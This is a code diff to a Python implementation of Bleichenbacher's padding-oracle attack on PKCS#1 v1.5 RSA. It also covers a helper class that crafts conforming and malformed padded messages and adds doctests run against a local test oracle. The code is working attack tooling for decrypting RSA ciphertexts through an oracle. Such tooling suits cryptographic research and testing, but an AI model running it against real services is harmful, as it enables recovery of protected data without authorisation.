@@ -4,11 +4,9 @@ import multiprocessing as mp
 import random
 import signal
 import threading as th
-from oracle import Oracle, ExecOracle
+from oracle import Oracle
 from Crypto.PublicKey import RSA
 from utils import NumUtils
-
-import time
 
 class RSAOracleWorker(mp.Process):
 
@@ -54,14 +52,16 @@ class RSAOracleWorker(mp.Process):
   def __parse_task(self, task):
     """ Returns a task as an RSATask object
     >>> o = Oracle()
-    >>> def callback():
+    >>> def callback(*args):
     ...   return True
     >>> inq, outq = mp.Queue(), mp.Queue()
     >>> worker = RSAOracleWorker(o, callback, inq, outq, 123456, 0x10001)
     >>> worker._RSAOracleWorker__parse_task((1,2,3,4,5)) == None
     True
     >>> worker._RSAOracleWorker__parse_task((1,2,3,4)) # doctest: +ELLIPSIS
-    <__main__.RSATask object ...
+    <....RSATask object ...
+    >>> inq.close()
+    >>> outq.close()
     """
     try:
       new_task = RSAOracleWorker.RSATask(task)
@@ -72,7 +72,7 @@ class RSAOracleWorker(mp.Process):
   def run(self):
     """
     >>> o = ExecOracle("./pkcs1_test_oracle.py", ["args", "%0256x"])
-    >>> def callback(stdout, stderr, rc):
+    >>> def callback(*args):
     ...   return True
     >>> inq, outq = mp.Queue(), mp.Queue()
     >>> worker = RSAOracleWorker(o, callback, inq, outq, 123456, 0x10001)
@@ -88,6 +88,8 @@ class RSAOracleWorker(mp.Process):
     >>> worker.join()
     >>> worker.is_alive()
     False
+    >>> inq.close()
+    >>> outq.close()
     """
     while True:
       task = self.tasks_queue.get()
@@ -108,7 +110,7 @@ class Bleichenbacher(object):
 
   def __init__(self, n, oracle, callback, e=0x10001, pool_size=mp.cpu_count()):
     """Builds an object to compute the Bleichenbacher attack
-    >>> def callback():
+    >>> def callback(*args):
     ...   pass
     >>> b = Bleichenbacher(1234123412341234, None, callback)
     Traceback (most recent call last):
@@ -147,22 +149,19 @@ class Bleichenbacher(object):
       self.callback = callback
     else:
       raise ValueError("Callback must be a function evaluating oracle output")
+    if pool_size <= 0:
+      raise ValueError("Number of threads in the pool must be strictly positive")
+    self.__pool_size = pool_size
     self.__logger.info("Bleichenbacher attack initialized with:")
     self.__logger.info("\tModulus: %i" % self.n)
     self.__logger.info("\tPublic exponent: %i" % self.e)
     self.__logger.info("\tKey size (in bits): %i" % self.k)
     self.__logger.info("\tOracle type: %s" % self.oracle.__class__.__name__)
-    self.__task_id = 0
-    self.__worker_pool_running = False
-    self.__worker_pool_init(pool_size)
-    self.__worker_pool_start()
-    self.__result_worker = th.Thread(target=self.__get_task_results)
-    self.__result_worker.start()
 
   @classmethod
   def pubkey_from_file(cls, key_file, oracle, callback):
     """Imports modulus and exponent information from a pem key file
-    >>> def callback():
+    >>> def callback(*args):
     ...   pass
     >>> o = Oracle()
     >>> b = Bleichenbacher.pubkey_from_file("keypairs/256.pub", o, callback)
@@ -193,13 +192,13 @@ class Bleichenbacher(object):
     for p in self.__worker_pool:
       self.__task_queue.put(Bleichenbacher.__POISON_PILL)
       p.terminate()
-      p.join()
+      p.join(2)
     self.__logger.info("Stopped all worker threads in the pool")
     self.__worker_pool_running = False
 
   def __result_thread_stop(self):
     self.__result_queue.put(Bleichenbacher.__POISON_PILL)
-    self.__result_worker.join()
+    self.__result_worker.join(2)
     self.__logger.info("Stopped result polling thread")
 
   def __submit_pool_task(self, task):
@@ -229,6 +228,13 @@ class Bleichenbacher(object):
     s_max = None
     c = NumUtils.to_int_error(c, "Ciphertext")
     
+    self.__task_id = 0
+    self.__worker_pool_running = False
+    self.__worker_pool_init(self.__pool_size)
+    self.__worker_pool_start()
+    self.__result_worker = th.Thread(target=self.__get_task_results)
+    self.__result_worker.start()
+    
     self.__logger.info("Starting search for:")
     self.__logger.info("\tCiphertext: %i" % c)
     self.__logger.info("\tAt start value: %i" % s_min)
@@ -257,6 +263,8 @@ class Bleichenbacher(object):
             it = self.__converge_s_interval(s_min, M)
           (s_min, s_max) = it.next()
           s_min, i = self.s_search(c, s_min, s_max)
+    self.stop_search()
+    return a, a % self.n
 
   def __get_task_results(self):
     res = []
@@ -274,7 +282,7 @@ class Bleichenbacher(object):
 
   def s_search(self, c, s_min, s_max=None):
     """
-    >>> def callback(stdout, stderr, rc):
+    >>> def callback(*args):
     ...   return True if rc != 2 else False
     >>> o = ExecOracle("./pkcs1_test_oracle.py", ["keypairs/1024.priv", "%0256x"])
     >>> b = Bleichenbacher.pubkey_from_file("keypairs/1024.pub", o, callback)
@@ -314,7 +322,7 @@ class Bleichenbacher(object):
 
   def __get_r_values(self, s, intervals):
     """returns the values of r for a given s/interval couple
-    >>> def callback():
+    >>> def callback(*args):
     ...   pass
     >>> o = ExecOracle("./pkcs1_test_oracle.py", ["keypairs/1024.priv", "%0256x"])
     >>> b = Bleichenbacher.pubkey_from_file("keypairs/1024.pub", o, callback)
@@ -343,7 +351,7 @@ class Bleichenbacher(object):
 
   def __get_search_intervals(self, R, s, M):
     """
-    >>> def callback():
+    >>> def callback(*args):
     ...   pass
     >>> o = ExecOracle("./pkcs1_test_oracle.py", ["keypairs/1024.priv", "%0256x"])
     >>> b = Bleichenbacher.pubkey_from_file("keypairs/1024.pub", o, callback)
@@ -364,7 +372,7 @@ class Bleichenbacher(object):
 
   def __converge_s_interval(self, s, M):
     """Once a single interval remains, converge towards the final value of a.
-    >>> def callback():
+    >>> def callback(*args):
     ...   pass
     >>> o = ExecOracle("./pkcs1_test_oracle.py", ["keypairs/1024.priv", "%0256x"])
     >>> b = Bleichenbacher.pubkey_from_file("keypairs/1024.pub", o, callback)
@@ -380,10 +388,8 @@ class Bleichenbacher(object):
       raise ValueError("M must contain only one interval")
     a = list(M)[0][0]
     b = list(M)[0][1]
-    # Used to be ceil
     r = NumUtils.floor_int(2 * (b * s - self.B2), self.n)
     while True:
-      # Used to be ceil
       s_min = NumUtils.ceil_int(self.B2 + r * self.n, b)
       s_max = NumUtils.floor_int(self.B3 + r * self.n, a)
       r += 1
@@ -403,12 +409,45 @@ class PKCS1_v15(object):
                 }
 
   def __init__(self, key_length):
-    self.k = key_length
+    """
+    >>> pad = PKCS1_v15(-1)
+    Traceback (most recent call last):
+    ValueError: Key length cannot be negative or null
+    >>> pad = PKCS1_v15(500)
+    >>> pad.k == 512 / 8
+    True
+    """
+    if key_length <= 0:
+      raise ValueError("Key length cannot be negative or null")
+    self.k = NumUtils.pow2_round(key_length) / 8
 
-  def get_random_padding(self, data):
-    return self.__get_random_bytes(data, ["\x00"])
+  def get_random_padding(self, length):
+    r""" Generates a random string of bytes with no null-bytes
+    >>> pad = PKCS1_v15(256)
+    >>> random_bytes = pad.get_random_padding(100)
+    >>> "\x00" in random_bytes
+    False
+    """
+    return self.__get_random_bytes(length, ["\x00"])
 
   def conforming_message(self, data):
+    r""" Creates a PKCS1 conforming message
+    >>> pad = PKCS1_v15(128)
+    >>> m = pad.conforming_message("123456")
+    Traceback (most recent call last):
+    ValueError: Cleartext too long to be conforming: max => 5 bytes, provided => 6 bytes
+    >>> m = pad.conforming_message("12345")
+    >>> m.startswith("\x00\x02")
+    True
+    >>> "\x00" not in m[2:10]
+    True
+    >>> "\x00" in m[10:]
+    True
+    >>> m[-6] == "\x00"
+    True
+    >>> m[-5:] == "12345"
+    True
+    """
     padding_len = self.k - len(data) - len(PKCS1_v15.HEADER) - len(PKCS1_v15.DELIMITER)
     if padding_len < PKCS1_v15.MIN_PAD_LEN:
       raise ValueError("Cleartext too long to be conforming: max => %i bytes, provided => %i bytes" % (self.k - PKCS1_v15.MIN_LEN, len(data)))
@@ -416,29 +455,65 @@ class PKCS1_v15(object):
     return PKCS1_v15.HEADER + random_padding + PKCS1_v15.DELIMITER + data
 
   def conforming_consecutive_null_bytes(self, data, index=-1, extra_nulls=2, pad_back=True):
+    r""" Creates a message with a consecutive set of "extra_nulls" null-bytes padding backwards from position "index"
+    if "pad_back" is true.
+    >>> pad = PKCS1_v15(256)
+    >>> m = pad.conforming_consecutive_null_bytes("123456", 10)  
+    >>> m[7:9] == "\x00"*2
+    True
+    >>> m = pad.conforming_consecutive_null_bytes("123456", 14, 4, False)
+    >>> m[14: 14 + 4] == "\x00"*4
+    True
+    """
     padded_m = self.conforming_message(data)
     if index == -1:
       index = padded_m.index("\x00", 1) + 1
     if pad_back == True:
       index -= (extra_nulls + 1)
-    if index < 0 or index >= self.k or index + extra_nulls >= self.k:
+    if index < 0 or index + extra_nulls >= self.k:
       raise IndexError("Cannot pad null bytes passed data boundary")
     return padded_m[:index] + "\x00"*extra_nulls + padded_m[index + extra_nulls:]
 
   def non_conforming_message_header(self, data, header="\x00\x01"):
-    return header + self.conforming_message(data)[2:]
+    r""" Creates a message starting with "header". Used to create non-conforming PKCS1 header
+    >>> pad = PKCS1_v15(256)
+    >>> m = pad.non_conforming_message_header("123456", "\x00\x03\x04")
+    >>> m.startswith("\x00\x03\x04")
+    True
+    """
+    return header + self.conforming_message(data)[len(header):]
 
   def non_conforming_padding_length(self, data, byte_index=4):
+    r""" Creates a message which contains a null-byte at position inside the 8 byte mandatory PKCS1 padding
+    >>> pad = PKCS1_v15(256)
+    >>> m = pad.non_conforming_padding_length("123456", 2)
+    >>> m[3] == "\x00"
+    True
+    """
     padded_m = self.conforming_message(data)
     abs_pos = len(PKCS1_v15.HEADER) + byte_index - 1
     return padded_m[:abs_pos] + "\x00" + padded_m[abs_pos + 1:]
 
   def non_conforming_no_delimiter(self, data, replacement="\xff"):
+    r""" Creates a message which contains no null-byte delimiter
+    >>> pad = PKCS1_v15(256)
+    >>> m = pad.non_conforming_no_delimiter("123456")
+    >>> "\x00" in m[1:]
+    False
+    """
     padded_m = self.conforming_message(data)
     null_index = padded_m.index("\x00", 1)
     return padded_m[:null_index] + replacement + padded_m[null_index + 1:]
 
   def __get_random_bytes(self, length, excluded=[]):
+    r""" Generates a random string of bytes, excluding the explicitely denied characters
+    >>> pad = PKCS1_v15(256)
+    >>> random_bytes = pad._PKCS1_v15__get_random_bytes(100, ["\x00", "\x20"])
+    >>> "\x00" in random_bytes
+    False
+    >>> "\x20" in random_bytes
+    False
+    """
     random_gen = random.Random()
     random_bytes = ""
     while (len(random_bytes) != length):
@@ -450,4 +525,4 @@ class PKCS1_v15(object):
 
 if __name__ == "__main__":
   import doctest
-  #doctest.testmod()
+  doctest.testmod()
